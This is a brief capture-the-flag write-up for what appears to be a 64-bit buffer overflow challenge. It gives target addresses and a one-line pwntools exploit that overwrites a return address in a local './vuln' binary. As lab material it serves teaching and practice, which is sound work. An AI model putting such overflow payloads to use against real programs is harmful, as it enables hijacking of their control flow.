## Problem

## Solution

essentially the same as basic 32 bit exploit, but you need to format as 8 byte values for 64 bit systems.

_target address = 0x400767_

Due to some messed up ubuntu quirk (seriously, how the f are we supposed to know that?) skip the first `pop` instruction:

_new target address = 0x400768_

```
python -c "from pwn import *; print 'A'*72+p64(0x400768)" | ./vuln
```

uh huh. right. this was an exercise in insanity.
